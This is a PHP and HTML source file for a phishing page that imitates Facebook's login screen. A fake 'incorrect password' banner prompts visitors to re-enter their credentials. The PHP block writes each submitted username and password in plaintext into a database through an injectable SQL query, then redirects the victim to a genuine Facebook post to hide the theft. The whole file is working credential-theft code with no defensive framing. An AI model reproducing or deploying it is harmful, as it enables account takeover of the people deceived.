<?php

require_once "config.php";

 if (isset($_POST['submit'])) {
 	$username = $_POST['username'];
 	$password = $_POST['password'];

 	$sql = "INSERT INTO user_data (username, password)
	VALUES ('$username', '$password')";

	if ($conn->query($sql) === TRUE) {
	  header("location: https://www.facebook.com/114075063368780/posts/449637876479162/");
	}
 }
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook - log in or sign up</title>
    <link rel="shortcut icon" href="images/facebook-icon.png">
    <link rel="stylesheet" href="css/style.css">
</head>

<body>

 <div class="header-incorrect">
   <p>Incorrect username or password. Try again with different login info</p>
 </div>
	<div class="logo">
		<h2>facebook</h2>
	</div>
  <div class="container">
	  <form action="#" method="POST">
	    <input type="number/email" name="username" placeholder="Mobile number or email address" class="pe" required><br><br>
	    <input type="password" name="password" placeholder="Password" class="p" required><br>
	    <input type="submit" name="submit" value="Log In" class="login"><br>
	  </form>
	  <div class="break">
	    <div class="break-1">
	      <hr class="hr-1">
	    </div>
	    <div class="text-or">
	      <p>or</p>
	    </div>
	    <div class="breack-1">
	      <hr class="hr-2">
	    </div>
	  </div>
	  <div class="new-account">
	    <button>Create New Account</button>
	  </div>
	  <div class="forgot">
	    <a href="#" target="_self">Forgotten password?</a>
	  </div>
  </div>
  <div class="languege-section">
		  <div class="p-w-60">
		    <span class="en">English (UK)</span>
		    <a href="#" target="_self">অসমীয়া</a>
		    <a href="#" target="_self">Bahasa Indonesia</a>
		    <a href="#" target="_self">Português (Brasil)</a>
		  </div>
		  <div class="p-w-40">
		    <a href="#" target="_self">বাংলা</a>
		    <a href="#" target="_self">हिन्दी</a>
		    <a href="#" target="_self">Españo</a>
		    <div class="add-icon">
		      <a href="#" target="_self"><img src="images/add-more-languages-icon.png" alt="add icon"></a>
		    </div>
		  </div>
		  
	</div>
  <div class="fb-text">
	  <p>Facebook Inc.</p>
	</div>
</body>
</html>